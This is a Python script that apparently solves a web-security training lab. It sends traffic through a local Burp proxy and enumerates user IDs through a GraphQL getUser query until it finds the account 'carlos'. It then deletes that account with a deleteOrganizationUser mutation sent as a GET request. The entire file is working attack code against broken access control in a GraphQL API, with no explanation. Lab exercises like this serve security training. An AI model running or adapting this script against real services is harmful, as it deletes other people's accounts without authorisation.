import requests
import sys
import urllib3, urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def url_encode(str):
    return urllib.parse.quote(str)

def getUser(s, url, path, id, target_username):
    query = "query($id:Int!){getUser(id:$id){id username}}"
    variable = f'{{"id":{id}}}'
    target_url = url + path + f'?query={url_encode(query)}&variables={url_encode(variable)}'
    r = s.get(target_url)
    
    if target_username in r.text:
        print(f'[+] Found {target_username} with id = {id}')
        return id
    else:
        print(f'[-] Id {id} is not {target_username}')
        return None

def deleteUser(s, url, path, id, target_username):
    query = "mutation($input:DeleteOrganizationUserInput){deleteOrganizationUser(input:$input){user{id username}}}"
    variable = f'{{"input":{{"id":{id}}}}}'
    target_url = url + path + f'?query={url_encode(query)}&variables={url_encode(variable)}'
    r = s.get(target_url)

    if target_username in r.text:
        print(f'[+] Successfull delete {target_username} account')
    else:
        print(f'[-] Failed to delete {target_username} account')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)
        
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    target_username = 'carlos'
    target_id = None
    for i in range(1, 10):
        target_id = getUser(s, url, '/api', i, target_username)
        if target_id: break
    deleteUser(s, url, '/api', target_id, target_username)
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()